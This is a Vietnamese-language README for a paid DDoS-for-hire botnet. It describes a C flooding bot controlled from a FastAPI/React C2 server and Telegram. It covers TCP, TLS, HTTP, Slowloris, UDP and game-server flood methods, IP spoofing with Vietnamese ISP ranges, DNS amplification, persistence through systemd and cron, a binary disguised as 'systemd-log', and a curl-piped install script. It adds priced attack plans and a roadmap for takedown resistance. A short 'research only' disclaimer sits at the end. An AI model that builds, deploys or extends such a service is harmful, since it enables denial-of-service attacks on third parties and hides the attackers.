**Version:** 4.0.0 Ultimate  
**License:** Private  
**Stack:** C (bot) • Python/FastAPI (backend) • React/TypeScript (frontend) • PostgreSQL + Redis

---

## 📁 Cấu trúc dự án

```
BOT-GITHUB/                          C2-SERVER/
├── src/bot.c       (1132 dòng)      ├── database/schema.sql
├── install.sh                       ├── backend/
└── .github/workflows/build.yml      │   ├── Dockerfile
                                      │   ├── requirements.txt
                                      │   └── app/
                                      │       ├── main.py             ← Entry point
                                      │       ├── config.py           ← Env settings
                                      │       ├── auth.py             ← JWT + bcrypt
                                      │       ├── database.py         ← PostgreSQL + Redis
                                      │       ├── mbbank.py           ← MB Bank payment
                                      │       ├── telegram_bot.py     ← Telegram C2 control
                                      │       ├── models/all_models.py
                                      │       ├── schemas/all_schemas.py
                                      │       ├── routers/            ← 5 routers
                                      │       ├── services/           ← 2 services
                                      │       └── websocket/bot_handler.py
                                      ├── frontend/                   ← React SPA
                                      │   ├── src/pages/              ← 8 pages
                                      │   └── src/components/         ← Sidebar
                                      └── deployment/
                                          ├── docker-compose.yml
                                          └── .env.example
```

---

## 🤖 BOT — Chức năng & Sức mạnh

### Tổng quan

Bot là 1 file C duy nhất (`bot.c`, 1132 dòng), compile ra static binary chạy trên mọi Linux. Kết nối WebSocket TLS đến C2 Server, nhận lệnh tấn công và thực thi.

### 7 Phương thức tấn công

| # | Method | Cơ chế | PPS/Bot | Yêu cầu | Ghi chú |
|---|--------|--------|---------|---------|---------|
| 1 | **MEGA** | TCP+TLS connection flood, multi-port | Exhaust FDs | Không | Connect + TLS + hold connection |
| 2 | **TLS_EXHAUST** | Alias MEGA (TCP+TLS) | Exhaust TLS | Không | Port random spread |
| 3 | **GAME** | NRO socket login spam, DB overload | 1024 conns | Không | XOR key "boys", craft login packet |
| 4 | **HTTP_PROXY** | HTTP qua proxy free, IP rotation | 256 req/s | Không | Auto-fetch 15 nguồn proxy |
| 5 | **HTTP** | HTTP keep-alive pool 512 conns | ~500 req/s | Không | Full requests, keep-alive loop |
| 6 | **SLOWLORIS** | 512 HTTP drip connections | < 1 Mbps | Không | Cạn kiệt connection pool |
| 7 | **UDP** | sendmmsg 1024-batch, spray 65535 port | Bandwidth | Không | Zero-byte datagrams |

### Resource Protection

| # | Kỹ thuật | Mô tả |
|---|----------|-------|
| 1 | **VN IP Spoofing** | 33 dải IP Việt Nam (VNPT, Viettel, FPT, Mobifone, CMC) |
| 2 | **Fragmentation** | SYN packets bị fragment → firewall không reassemble kịp |
| 3 | **TTL Manipulation** | Mỗi packet TTL ngẫu nhiên 50-124 |
| 4 | **Payload Mutation** | Mỗi HTTP request có header khác nhau, 7 User-Agent |
| 5 | **IP Rotation** | Mỗi SYN packet source IP khác → rate limit vô hiệu |
| 6 | **Encrypt/Obfuscate** | Payload XOR encrypt + bit shift obfuscate |
| 7 | **DNS Amplification** | DNS ANY query → 50x amplification |
| 8 | **Game Mimic** | UDP packet giả game protocol |
| 9 | **Mixed Traffic** | 6 method ngẫu nhiên → không pattern cố định |
| 10 | **MEGA Mode** | 65535 sockets, MSG_ZEROCOPY, mmap ring buffer |

### Performance tối ưu (tích hợp từ fjium-*)

- `SO_SNDBUFFORCE` 128MB buffer
- `sendmmsg` MEGA_BATCH 65535
- `MSG_ZEROCOPY` kernel bypass
- `mmap` ring buffer 1MB
- `nice(-20)` + `mlockall` real-time priority
- `pthread_setaffinity_np` CPU pinning
- `aligned_alloc(64)` cache-line aligned
- `SO_PRIORITY` + `IP_TOS` QoS
- 8 socket/thread pool
- Token bucket rate limiter chính xác

### Các tính năng khác

- **Daemon:** `fork()` + `setsid()` true background
- **Persistence:** systemd service + cron @reboot (double fallback)
- **Auto-update:** GitHub Releases API → tự download binary mới → restart
- **Heartbeat:** Mỗi 10s gửi uptime, CPU usage
- **HWID:** SHA256(CPU serial + MAC + machine-id)
- **Reconnect:** Exponential backoff 5s → 300s

---

## 🖥️ C2 SERVER — Chức năng

### Backend (FastAPI + Python)

| Router | Chức năng |
|--------|----------|
| `auth_router` | Đăng nhập/đăng ký, JWT token |
| `bot_router` | CRUD bot, toggle ON/OFF, throttle, assign, ban |
| `attack_router` | Launch/stop attack, xem lịch sử |
| `admin_router` | Dashboard stats, user management, logs |
| `plan_router` | Xem danh sách plans |

### Web Dashboard (React + TypeScript + Tailwind)

| Trang | Chức năng |
|-------|----------|
| **Login** | Đăng nhập JWT |
| **Dashboard** | Realtime stats: online bots, active attacks, packets, bandwidth |
| **Bots** | Bảng bot + filter (status, rented, search) + toggle/ban |
| **Bot Detail** | Throttle slider (PPS, Mbps, Threads), method toggle, spoof mode |
| **Attack** | Form launch attack (11 method, spoof, frag, MEGA) + active table |
| **Plans** | 3 gói cước + nút mua qua MB Bank |
| **Users** | Quản lý user, ban/unban |
| **Logs** | Admin activity logs |

### Telegram Bot

| Lệnh | Chức năng |
|------|----------|
| `/start` | Link tài khoản Telegram |
| `/plans` | Xem gói cước + giá |
| `/buy` | Mua gói (Stripe/MB Bank) |
| `/attack` | Chọn method → nhập target → launch |
| `/stop` | Dừng tất cả attack |
| `/status` | Xem attack đang chạy |
| `/balance` | Số dư + plan |
| `/bots` | Bot online |
| `/help` | Menu |

### Thanh toán

| Phương thức | Đối tượng | Cơ chế |
|------------|----------|--------|
| **Stripe** | Quốc tế (USD) | Webhook realtime |
| **MB Bank** | Việt Nam (VND) | Scanner quét giao dịch 30s/lần, auto match |

**MB Bank — Không cần re-login:**
- `deviceId` UUID cố định lưu Redis vĩnh viễn
- `sessionId` + `token` tự động refresh khi hết hạn
- Captcha chỉ cần 1 lần lúc login đầu, dùng pytesseract OCR
- Fallback: gửi ảnh captcha qua Telegram cho admin giải

### Plans

| Plan | Giá VND | Giá USD | Bot | Duration | PPS | Methods |
|------|---------|---------|-----|----------|-----|---------|
| **Basic** | 50,000đ | $5 | 1 | 60s | 100K | UDP, TCP |
| **Pro** | 150,000đ | $15 | 5 | 180s | 500K | +HTTP, SYN, ICMP, MIX |
| **Enterprise** | 500,000đ | $50 | 20 | 600s | 2M | +SLOWLORIS, TLS, DNS, GAME, MEGA |

---

## 🚀 Hướng dẫn cài đặt

### Yêu cầu hệ thống

| Thành phần | Yêu cầu tối thiểu | Khuyến nghị |
|-----------|-------------------|-------------|
| **C2 Server** | 2 CPU, 2GB RAM, 20GB disk | 4 CPU, 4GB RAM |
| **Bot VPS** | 1 CPU, 512MB RAM | 4 CPU, 2GB RAM, 1Gbps network |
| **OS** | Ubuntu 22.04+ / Debian 12+ | |
| **Dependencies** | Docker + Docker Compose | |

---

### Bước 1: Deploy C2 Server

```bash
# 1. Clone hoặc copy toàn bộ C2-SERVER lên VPS
cd C2-SERVER

# 2. Cấu hình
cp deployment/.env.example .env
nano .env  # ← Sửa các biến bên dưới
```

**Các biến cần cấu hình trong `.env`:**

```bash
# Bắt buộc
JWT_SECRET=super-secret-change-this-to-random-64-char-string
DB_PASSWORD=changeme
REDIS_PASSWORD=redispass

# Domain
C2_DOMAIN=api.your-domain.com
DASHBOARD_URL=https://your-domain.com

# Telegram Bot (tạo bot qua @BotFather)
TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghikl
TELEGRAM_ADMIN_CHAT_ID=123456789

# Stripe (nếu muốn thanh toán quốc tế)
STRIPE_SECRET_KEY=sk_live_xxx
STRIPE_WEBHOOK_SECRET=whsec_xxx

# MB Bank (thanh toán VND tự động)
MB_USERNAME=0912345678
MB_PASSWORD=your_mb_password
```

```bash
# 3. Deploy
docker compose -f deployment/docker-compose.yml up -d

# 4. Kiểm tra
curl https://localhost/health
# → {"status": "ok"}
```

---

### Bước 2: Build & Deploy Bot

**Cách 1: Build thủ công**

```bash
# Trên máy build (Ubuntu/Debian)
apt install -y build-essential libssl-dev zlib1g-dev

# Build static binary (chạy mọi nơi)
gcc -O3 -std=c11 -static -pthread \
    -march=x86-64 -mtune=generic -flto -DNDEBUG \
    BOT-GITHUB/src/bot.c -o bot_static \
    -lssl -lcrypto -lz -ldl -lpthread

strip bot_static
```

**Cách 2: Deploy qua GitHub Actions (CI/CD)**

```bash
# 1. Tạo repo GitHub mới, push code từ BOT-GITHUB/ lên
cd BOT-GITHUB
git init && git add . && git commit -m "init"
git remote add origin https://github.com/YOUR_ORG/bot.git
git push -u origin main

# 2. Push tag để trigger build
git tag v4.0.0 && git push origin v4.0.0
# → GitHub Actions tự build → Release bot_static
```

**Cài bot lên VPS:**

```bash
# Cách 1: Copy thủ công
scp bot_static root@bot-vps:/usr/bin/systemd-log
ssh root@bot-vps "setcap cap_net_raw+ep /usr/bin/systemd-log"
ssh root@bot-vps "/usr/bin/systemd-log wss://your-c2-domain.com/ws/bot/"

# Cách 2: Qua GitHub (1 lệnh)
curl -sL https://raw.githubusercontent.com/YOUR_ORG/bot/main/install.sh | bash -s wss://your-c2-domain.com/ws/bot/
```

---

### Bước 3: Build Frontend

```bash
cd C2-SERVER/frontend
npm install
npm run build
# → dist/ được serve bởi backend
```

---

### Bước 4: Đăng nhập & Sử dụng

1. **Web Dashboard:** `https://your-domain.com/` → Login: `admin` / `admin123`
2. **Telegram Bot:** Tìm bot của bạn trên Telegram → `/start`
3. **API:** `https://your-domain.com:443/api/`

---

## 🔒 Bảo mật

| Lớp | Biện pháp |
|-----|----------|
| **Auth** | JWT (HS256, expire 60 phút) + bcrypt hash |
| **API** | Tất cả endpoints cần Bearer token |
| **Admin** | Route riêng, chỉ role=admin |
| **Docs** | `docs_url=None` — không Swagger public |
| **Build** | `sourcemap: false` — không leak source React |
| **Bot** | HWID verification, không thể fake |
| **Payment** | Stripe: verify webhook signature. MB Bank: chỉ scan read-only |
| **Rate limit** | Token bucket per-bot, không thể vượt config |

---

## 📊 Kiến trúc tổng quan

```
┌──────────────────────────────────────────────────────────┐
│                     C2 SERVER (VPS)                       │
│                                                          │
│  🌐 Web Dashboard (React) ◀──▶ FastAPI (Python)          │
│  📱 Telegram Bot          ◀──▶ PostgreSQL + Redis         │
│  💳 Stripe/MB Bank        ◀──▶ WebSocket Gateway         │
│                                                          │
└──────────────────────────┬───────────────────────────────┘
                           │
              ┌────────────┴────────────┐
              │                         │
         Bot VPS #1                Bot VPS #2
    ┌─────┴─────┐            ┌─────┴─────┐
    │  bot.c    │            │  bot.c    │
    │  WSS TLS  │            │  WSS TLS  │
    │  11 method│            │  11 method│
    │  MEGA mode│            │  MEGA mode│
    └───────────┘            └───────────┘
```

---

## 🔧 Khắc phục sự cố

| Vấn đề | Giải pháp |
|--------|----------|
| Bot không kết nối được | Kiểm tra C2 domain, port, firewall. Bot cần WSS |
| SYN flood không hoạt động | `setcap cap_net_raw+ep /usr/bin/systemd-log` |
| MB Bank không scan được | Kiểm tra `MB_USERNAME`, `MB_PASSWORD`. Có thể cần giải captcha lần đầu |
| Telegram bot không trả lời | Kiểm tra `TELEGRAM_BOT_TOKEN` |
| Frontend trắng | `cd frontend && npm run build` |
| Database không khởi tạo | `docker compose down -v && docker compose up -d` |

---

## 🚧 Đề xuất cải tiến

### Ngắn hạn (có thể thêm ngay)

| Tính năng | Mô tả |
|----------|-------|
| **Auto-renew subscription** | Tự động gia hạn plan khi hết hạn nếu user có credit |
| **Webhook notifications** | Gửi Telegram/Discord khi attack complete, bot offline |
| **Multi-user attack queue** | Hàng đợi attack khi hết bot, tự động chạy khi có bot rảnh |
| **Geo-IP map** | Hiển thị bot trên bản đồ thế giới (Leaflet) |
| **Attack templates** | Lưu preset attack (target, method, duration) để dùng lại |
| **Export logs** | Export CSV/JSON lịch sử attack |

### Dài hạn (cần thêm thời gian)

| Tính năng | Mô tả |
|----------|-------|
| **Layer 7 Advanced** | HTTP/2 Rapid Reset, WebSocket flood, GraphQL abuse |
| **Proxy chain** | Bot → SOCKS5 → Target để ẩn IP thật |
| **Captcha solver** | Tích hợp 2captcha/AntiCaptcha cho MB Bank |
| **Reseller system** | Cho phép user tạo sub-user, chia hoa hồng |
| **Mobile app** | React Native app để điều khiển qua điện thoại |
| **AI traffic analysis** | ML model phát hiện pattern firewall để tự động chọn method |
| **Auto-scaling** | Tự động deploy thêm bot VPS khi load cao |
| **Multi-C2** | Fallback C2 servers nếu main bị takedown |
| **gRPC protocol** | Thay WebSocket bằng gRPC stream cho performance cao hơn |
| **BGP hijack protection** | Tự động detect và switch C2 IP nếu bị null route |

---

## ⚠️ Disclaimer

Dự án này chỉ dành cho mục đích nghiên cứu và giáo dục. Người dùng tự chịu trách nhiệm về việc sử dụng.

---

**Tổng: 43 file, 3855 dòng code**  
**Bot: 1132 dòng C, 11 method, 10 bypass, MEGA mode**  
**Server: FastAPI + React + PostgreSQL + Redis + Telegram + Stripe + MB Bank**
